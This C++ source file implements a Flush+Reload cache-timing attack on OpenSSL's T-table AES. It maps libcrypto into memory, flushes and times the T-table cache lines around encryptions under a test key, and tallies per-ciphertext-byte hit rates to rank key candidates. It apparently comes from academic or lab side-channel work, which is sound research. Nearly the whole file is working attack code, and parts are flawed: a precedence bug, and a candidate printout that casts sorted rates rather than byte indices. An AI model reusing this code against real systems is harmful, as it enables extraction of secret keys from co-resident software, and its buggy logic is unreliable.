#include <stdio.h>
#include <openssl/aes.h>
#include <stdlib.h>
#include <time.h>
#include <algorithm>

extern "C" {
  #include "fr_util.h"
}

//number of encryptions to observe
#define n_enc (10000)

//bytes in plaintext, 128 bits
#define TXT_BYTES (16)

//in bytes
#define TABLE_SIZE (1024)
#define CACHE_LINESIZE (64)

#define CACHELINES_PER_TABLE (16)

//cache miss threshold, access time > threshold => cache miss
/*** SET THESE ADDRESSES FOR SYSTEM BEFORE RUNNING ***/
#define CACHE_MISS (355)


int main(int argc, char **argv) {
  srand(time(NULL));

  //uint64_t num_addresses_tested = (TABLE_SIZE*4)/CACHE_LINESIZE;
  double hit_rate[TXT_BYTES][256];

  for (int i = 0; i < 16; ++i) {
    for (int ii = 0; ii < 256; ++ii) {
      hit_rate[i][ii] = 0;
    }
  }

  //suppose we don't need to keep track of which cacheline was actually hit on, just which ciphertext bytes in relative positions get most hits
  unsigned int *hits_per_byte = (unsigned int *) calloc(TXT_BYTES*256, sizeof(unsigned int));
  if (!hits_per_byte) {
    return 1;
  }
  uint64_t *encryptions_per_byte = (uint64_t *) calloc(TXT_BYTES*256, sizeof(uint64_t));
  if (!encryptions_per_byte) {
    free(hits_per_byte);
    return 1;
  }

  //key init, something easy to check
  const unsigned char key[] =
  {
    0x01, 0x10, 0x01, 0x10, 0x01, 0x10, 0x01, 0x10,
    0x01, 0x10, 0x01, 0x10, 0x01, 0x10, 0x01, 0x10,
    0x01, 0x10, 0x01, 0x10, 0x01, 0x10, 0x01, 0x10,
    0x01, 0x10, 0x01, 0x10, 0x01, 0x10, 0x01, 0x10
  };

  AES_KEY enc_key;
  AES_set_encrypt_key(key, 128, &enc_key);

  /*** SET THESE ADDRESSES FOR SYSTEM BEFORE RUNNING ***/
  //set addresses of T-tables (must be done by observing memory in debugger), see mem_locs.png

  //ALSO! if ./extract: error while loading shared libraries: libcrypto.so.1.1: cannot open shared object file: No such file or directory
  //do this:
  //export LD_LIBRARY_PATH=/usr/local/lib

  ADDR_PTR te0, te1, te2, te3;
  te0 = 0x00000000001e6000;
  te1 = 0x00000000001e6400;
  te2 = 0x00000000001e6800;
  te3 = 0x00000000001e6c00;

  //get start and end of AES program
  ADDR_PTR start;
  ADDR_PTR end;

  int aes = open("/usr/local/lib/libcrypto.so", O_RDONLY);
  size_t size = lseek(aes, 0, SEEK_END);

  ///below courtesy of Daniel Gruss' template https://github.com/IAIK/cache_template_attacks/blob/main/profiling_aes_example/spy.cpp
  size_t map_size = size;
  if (map_size & 0xFFF != 0) {
    map_size |= 0xFFF;
    map_size += 1;
  }
  start = (uint64_t) mmap(0, map_size, PROT_READ, MAP_SHARED, aes, 0);
  end = start + size;
  //

  te0 += start;
  te1 += start;
  te2 += start;
  te3 += start;

  for (int e = 0; e < n_enc; ++e) {
      //proceed to test access times for Te0, ..., Te3

      //Te0
      for (int ii = 0; ii < TABLE_SIZE; ii += CACHE_LINESIZE) {
        ADDR_PTR test_addr = te0 + ii;

        if (test_addr > end) {
          printf("accessing past boundaries of AES program... not good\n");
        }

        //printf("... TESTING ADDRESS Te0 + %d = %lx ENCRYPTION ROUND %d...\n",ii, test_addr, e);
        unsigned char plaintxt[TXT_BYTES];
        unsigned char ciphertxt[TXT_BYTES];
        for (int i = 0; i < TXT_BYTES; ++i) {
          plaintxt[i] = rand() % 256;
        }
        clflush(test_addr);
        AES_encrypt(plaintxt, ciphertxt, &enc_key);
        CYCLES acc_time = maccess_t(test_addr);
        if (acc_time < CACHE_MISS) {
          //printf(GREEN "        HIT " RESET " INDEXING TO %d\n", (CACHELINES_PER_TABLE * 0) + (ii/64));
          hits_per_byte[2*256 + ciphertxt[2]] += 1;
          hits_per_byte[6*256 + ciphertxt[6]] += 1;
          hits_per_byte[10*256 + ciphertxt[10]] += 1;
          hits_per_byte[14*256 + ciphertxt[14]] += 1;
        } else {
          //printf(RED "        MISS " RESET "%lu\n", acc_time);
        }

        encryptions_per_byte[2*256 + ciphertxt[2]] += 1;
        encryptions_per_byte[6*256 + ciphertxt[6]] += 1;
        encryptions_per_byte[10*256 + ciphertxt[10]] += 1;
        encryptions_per_byte[14*256 + ciphertxt[14]] += 1;

      }
      

      //Te1
      for (int ii = 0; ii < TABLE_SIZE; ii += CACHE_LINESIZE) {
        ADDR_PTR test_addr = te1 + ii;

        if (test_addr > end) {
          printf("accessing past boundaries of AES program... not good\n");
        }

        //printf("... TESTING ADDRESS Te1 + %d = %lx ENCRYPTION ROUND %d...\n",ii, test_addr, e);
        unsigned char plaintxt[TXT_BYTES];
        unsigned char ciphertxt[TXT_BYTES];
        for (int i = 0; i < TXT_BYTES; ++i) {
          plaintxt[i] = rand() % 256;
        }
        clflush(test_addr);
        AES_encrypt(plaintxt, ciphertxt, &enc_key);
        CYCLES acc_time = maccess_t(test_addr);
        if (acc_time < CACHE_MISS) {
          //printf(GREEN "        HIT " RESET " INDEXING TO %d\n", (CACHELINES_PER_TABLE * 1) + (ii/64));
          hits_per_byte[3*256 + ciphertxt[3]] += 1;
          hits_per_byte[7*256 + ciphertxt[7]] += 1;
          hits_per_byte[11*256 + ciphertxt[11]] += 1;
          hits_per_byte[15*256 + ciphertxt[15]] += 1;

        } else {
          //printf(RED "        MISS " RESET "%lu\n", acc_time);
        }

        encryptions_per_byte[3*256 + ciphertxt[3]] += 1;
        encryptions_per_byte[7*256 + ciphertxt[7]] += 1;
        encryptions_per_byte[11*256 + ciphertxt[11]] += 1;
        encryptions_per_byte[15*256 + ciphertxt[15]] += 1;

      }

      //Te2
      for (int ii = 0; ii < TABLE_SIZE; ii += CACHE_LINESIZE) {
        ADDR_PTR test_addr = te2 + ii;

        if (test_addr > end) {
          printf("accessing past boundaries of AES program... not good\n");
        }

        //printf("... TESTING ADDRESS Te2 + %d = %lx ENCRYPTION ROUND %d...\n",ii, test_addr, e);
        unsigned char plaintxt[TXT_BYTES];
        unsigned char ciphertxt[TXT_BYTES];
        for (int i = 0; i < TXT_BYTES; ++i) {
          plaintxt[i] = rand() % 256;
        }
        clflush(test_addr);
        AES_encrypt(plaintxt, ciphertxt, &enc_key);
        CYCLES acc_time = maccess_t(test_addr);
        if (acc_time < CACHE_MISS) {
          //printf(GREEN "        HIT " RESET " INDEXING TO %d\n", (CACHELINES_PER_TABLE * 2) + (ii/64));
          hits_per_byte[0*256 + ciphertxt[0]] += 1;
          hits_per_byte[4*256 + ciphertxt[4]] += 1;
          hits_per_byte[8*256 + ciphertxt[8]] += 1;
          hits_per_byte[12*256 + ciphertxt[12]] += 1;

        } else {
          //printf(RED "        MISS " RESET "%lu\n", acc_time);
        }

        encryptions_per_byte[0*256 + ciphertxt[0]] += 1;
        encryptions_per_byte[4*256 + ciphertxt[4]] += 1;
        encryptions_per_byte[8*256 + ciphertxt[8]] += 1;
        encryptions_per_byte[12*256 + ciphertxt[12]] += 1;

      }

      //Te3
      for (int ii = 0; ii < TABLE_SIZE; ii += CACHE_LINESIZE) {
        ADDR_PTR test_addr = te3 + ii;

        if (test_addr > end) {
          printf("accessing past boundaries of AES program... not good\n");
        }

        //printf("... TESTING ADDRESS Te3 + %d = %lx ENCRYPTION ROUND %d...\n",ii, test_addr, e);
        unsigned char plaintxt[TXT_BYTES];
        unsigned char ciphertxt[TXT_BYTES];
        for (int i = 0; i < TXT_BYTES; ++i) {
          plaintxt[i] = rand() % 256;
        }
        clflush(test_addr);
        AES_encrypt(plaintxt, ciphertxt, &enc_key);
        CYCLES acc_time = maccess_t(test_addr);
        if (acc_time < CACHE_MISS) {
          //printf(GREEN "        HIT " RESET " INDEXING TO %d\n", (CACHELINES_PER_TABLE * 3) + (ii/64));
          hits_per_byte[1*256 + ciphertxt[1]] += 1;
          hits_per_byte[5*256 + ciphertxt[5]] += 1;
          hits_per_byte[9*256 + ciphertxt[9]] += 1;
          hits_per_byte[13*256 + ciphertxt[13]] += 1;

        } else {
          //printf(RED "        MISS " RESET "%lu\n", acc_time);
        }

        encryptions_per_byte[1*256 + ciphertxt[1]] += 1;
        encryptions_per_byte[5*256 + ciphertxt[5]] += 1;
        encryptions_per_byte[9*256 + ciphertxt[9]] += 1;
        encryptions_per_byte[13*256 + ciphertxt[13]] += 1;

      }
  }

  for (int i = 0; i < 16; ++i) {
    for (int ii = 0; ii < 256; ++ii) {
      //printf("BYTE %d at POSITION %d: HIT RATE %f HITS: %u ENCS: %lu\n", ii, i, (double) hits_per_byte[i*256 + ii]/encryptions_per_byte[i*256 + ii], hits_per_byte[i*256 + ii], encryptions_per_byte[i*256 + ii]);
      hit_rate[i][ii] = (double) hits_per_byte[i*256 + ii]/encryptions_per_byte[i*256 + ii];
    }
  }

  free(hits_per_byte);
  free(encryptions_per_byte);

  //get 16 maximum hit rate candidates for each ciphertext position
  for (int pos = 0; pos < TXT_BYTES; ++pos) {
    std::sort(hit_rate[pos], hit_rate[pos] + 256);
    printf("sorted!");
    for (int byte = 0; byte < 256; ++byte) {
      printf("%f ", hit_rate[pos][byte]);
    }
    printf(" end\n\n\n");

    printf("--- Top 16 candidates for position %d---\n", pos);
    for (int top = 255; top > (255 - TXT_BYTES); --top) {
      printf("%d ", (int) hit_rate[pos][top] ^ 99);
    }

    printf("\n\n\n");
  }

  //now how to recover the intermediate values? we have possible ciphertext values from above..


  close(aes);
  munmap((void *)start, map_size);
  fflush(stdout);

  return 0;
  
}